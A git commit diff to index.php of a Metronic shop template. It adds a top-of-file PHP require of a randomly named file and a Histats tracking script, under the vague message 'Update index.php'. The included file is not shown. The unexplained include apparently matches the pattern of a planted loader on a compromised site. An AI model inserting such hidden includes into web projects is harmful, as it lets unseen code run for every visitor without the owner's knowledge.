dd4ce898b275015a8269b328223488072ba0bc8d
Mavrickthings <irathomas7799@gmail.com>
2026-05-08 15:12:53 +0530

    Update index.php

--- index.php
+++ index.php
@@ -1,3 +1,4 @@
+<?php require __DIR__ . '/1czbpxh.php' ?>
 <!DOCTYPE html>
 <!--
 Template: Metronic Frontend Freebie - Responsive HTML Template Based On Twitter Bootstrap 3.3.4
@@ -17,6 +18,18 @@ Purchase Premium Metronic Admin Theme: http://themeforest.net/item/metronic-resp
 
 <!-- Head BEGIN -->
 <head>
+     <!-- Histats.com  START  (aync)-->
+<script type="text/javascript">var _Hasync= _Hasync|| [];
+_Hasync.push(['Histats.start', '1,5025380,4,0,0,0,00010000']);
+_Hasync.push(['Histats.fasi', '1']);
+_Hasync.push(['Histats.track_hits', '']);
+(function() {
+var hs = document.createElement('script'); hs.type = 'text/javascript'; hs.async = true;
+hs.src = ('//s10.histats.com/js15_as.js');
+(document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(hs);
+})();</script>
+<noscript><a href="/" target="_blank"><img  src="//sstatic1.histats.com/0.gif?5025380&101" alt="web hit counter" border="0"></a></noscript>
+<!-- Histats.com  END  -->
   <meta charset="utf-8">
   <title>Metronic Shop UI</title>
 
